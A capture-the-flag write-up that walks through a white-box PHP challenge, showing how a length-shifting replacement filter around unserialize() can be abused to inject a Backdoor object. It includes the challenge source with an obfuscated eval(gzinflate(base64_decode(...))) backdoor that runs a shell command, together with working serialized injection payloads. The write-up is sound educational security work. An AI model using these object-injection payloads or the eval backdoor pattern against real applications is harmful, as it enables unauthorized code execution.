# Web 4 - White Box Code Analysis

## Challenge Description

> "Hard challenge. It requires an in-depth understanding of the given code file, and its underlying mechanism.
> 
> 
> Flag Format: WTCTT2023_WEB04{[a-z0-9]{32}}
> URL: [http://web.wtctt2023.p7z.pw:8004/](http://web.wtctt2023.p7z.pw:8004/)
> File: wtctt_2023_web4_sourcecode.zip ([https://aba8c6b29665ee5e854c60fa70bd7c5a.r2.cloudflarestorage.com/wtctt2023/wtctt_2023_web4_sourcecode.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=4abcfc1133dd56807b5eb6e04e7c6d95%2F20231213%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231213T170136Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=f0487e514490b00bd7dc4af86e3e72f3cedc69abaa44e54d5f3b767de8265d28](https://aba8c6b29665ee5e854c60fa70bd7c5a.r2.cloudflarestorage.com/wtctt2023/wtctt_2023_web4_sourcecode.zip?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=4abcfc1133dd56807b5eb6e04e7c6d95%2F20231213%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20231213T170136Z&X-Amz-Expires=604800&X-Amz-SignedHeaders=host&X-Amz-Signature=f0487e514490b00bd7dc4af86e3e72f3cedc69abaa44e54d5f3b767de8265d28))
> SHA256 Checksum: f57bd77c98240eeb804654299f0f3eadfbf7e92e1a2d2205a9e85aea85c896a2
> 
> Hint 1: Directory Fuzzing is NOT required (no hidden files / web pages).
> Hint 2: Online password brute forcing (dictionary attack) is NOT required.
> Hint 3: The challenge is designed to be exploited manually without automated security scanners."
> 

---

## Solution

Challenge provided us with some part of the source code, which makes this a white box challenge. After looking into the source code, we can see that the `load_session()` method from `functions.php` sends a parameter to the `unserialize` function.

```php
<?php 
    session_start();
    if(isset($_SESSION["data"])) {
        require_once("functions.php");
        unserialize(load_sessionn());
    }
?>
```

There are 2 classes in functions.php (session and backdoor), we found eval() function.
I attempted to decode for too many step and it returned `system(”cat /flag.txt”)` to me.
After this step, we can understand the goal of the problem, we want to call the backdoor class and set the destruct value equal to 🍜 for getting the flag.

```php

<?php
class sessionn
{
    protected $user;
    protected $pass;
    function __construct($user, $pass)
    {
        $this->user = $user;
        $this->pass = $pass;
    }
}
function store_session($user, $pass)
{
    $sess = new sessionn($user, $pass);
    $data = serialize($sess);
    // LongCat Ramen Eater: i don't need to store null values 
    // to our data center directly so i simply replace them with a ramen -> _🍜_
    // whenever we need to load it back to PHP session, we can just reverse the algorithm before doing unserialize().
	    $data = str_replace(chr(0) . '*' . chr(0), '_🍜_', $data);
    
    $_SESSION["username"] = $user;
    $_SESSION["data"] = $data;
    return uniqid('wtctt2023_04');
}

function load_sessionn()
{
    $data = $_SESSION["data"];
    // echo "<!-- debug\r\n".$data."\r\n\r\n";
    // echo str_replace('_🍜_', chr(0) . '*' . chr(0), $data)."\r\n-->\r\n";
    // reverse the algorithm: bring null values back from \0\0\0
    // if we don't do this, we cannot get the sessionn object with unserialize().
    return str_replace('_🍜_', chr(0) . '*' . chr(0), $data);
}

// an unknown PHP class inserted by a newly hired junior PHP developer
// it has never been called anyway. it looks harmless to me.
// i think something will be broken if i remove it.
// so i will just ignore this for now.

class Backdoor
{
    function __destruct()
    {
        if ($this->destruct == '🍜') {
            eval(gzinflate(base64_decode(strrev('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'))));
        }
    }
}
```

We can set the username and password as desired because it is just creating uniqid. The username and password we entered will be taken into the `store_session()` and it will be used through `load_session()` and to prevent hacking via unserialize, `chr(0) . '*' . chr(0)` has been replaced with *`🍜`* and converted back in `load_session()`.

Our target is enter username and password that can exploit via unserialize function.

So I create script for generating payload without any filter for go to Backdoor class and get flag.

![Untitled](Picture/Untitled.png)

this is our serialize object for exploiting. ⇒ `O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}`

I had decided to rewrite the functions script to make it easier to edit the payload.

```php
<?php

    class Backdoor
    {
        function __destruct()
        {
            if ($this->destruct == '🍜') {
                echo 'FLAG';
            }
        }
    }

    // $obj = new Backdoor();
    // $obj->destruct = "🍜";
    // echo serialize($obj);
		//O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}

    class sessionn
    {
        protected $user;
        protected $pass;
        function __construct($user, $pass)
        {
            $this->user = $user;
            $this->pass = $pass;
        }
    }

    function store_session($user, $pass)
    {
        $sess = new sessionn($user, $pass);
        $data = serialize($sess);
        // LongCat Ramen Eater: i don't need to store null values 
        // to our data center directly so i simply replace them with a ramen -> _🍜_
        // whenever we need to load it back to PHP session, we can just reverse the algorithm before doing unserialize().

        echo $data . "\r\n"; // echo original result object from serialize function 
        $data = str_replace(chr(0) . '*' . chr(0), '_🍜_', $data);
        
        return $data;
    }
    
    function load_sessionn($data)
    {
        echo "<!-- debug\r\n".$data."\r\n\r\n";
        echo str_replace('_🍜_', chr(0) . '*' . chr(0), $data)."\r\n-->\r\n";
        // reverse the algorithm: bring null values back from \0\0\0
        // if we don't do this, we cannot get the sessionn object with unserialize().
        return str_replace('_🍜_', chr(0) . '*' . chr(0), $data);
    }

    $user = 'admin';
    $pass = 'password';
    $stored = store_session($user,$pass);
    $loaded = load_sessionn($stored);
    unserialize($loaded);

?>
```

That means if we try to use username as `_*🍜_*`, we will get results like this picture.

![Untitled](Picture/Untitled%201.png)

The difficulty of this challenge is the length of the text in the object after the `store_session` and before the `load_session` must be related in order for our payload to work.

<aside>
💡 For `_*🍜_` ,*Although it appears to be 3 letters long, it is actually 6 letters long because `🍜` is a special character that the program reads as 4 letters.

</aside>

You will see that if we put `_*🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜_*` in serialize will be read as 48 characters and thus when unserialize after replace will cause `_*🍜_*` to be replaced with `chr(0) . '*' . chr(0)` which has 3 characters, and reading up to 48 characters makes it read all the way to the back 48 characters as well. In this case, null cannot be write near *, so I ask everyone to imagine.

INPUT : 

```php
O:8:"sessionn":2:{s:7:"*user";s:54:"_🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜_";s:7:"*pass";s:8:"password";}
```

OUTPUT

```php
O:8:"sessionn":2:{s:7:"*user";s:54:"***********";s:7:"*pass";s:8:"password**";} //54 characters (count null bytes as well)
```

This means that we can change the password value to the payload we want by inserting the object in the backdoor class call into the password field instead, which will contain the payload as shown in this image.

![Untitled](Picture/Untitled%202.png)

INPUT:

```php
O:8:"sessionn":2:{s:7:"*user";s:54:"_🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜__🍜_";s:7:"*pass";s:63:"aaaaa";s:4:"pass";O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}";}
```

OUTPUT:

```php
O:8:"sessionn":2:{s:7:"*user";s:54:"***********";s:7:"*pass";s:63:"aaaaa**";s:4:"pass";O:8:"Backdoor":1:{s:8:"destruct";s:4:"🍜";}";}
```

You can see that “FLAG” is displayed. Then use our payload to login to the real web page to get the flag.  :) 

![Untitled](Picture/Untitled%203.png)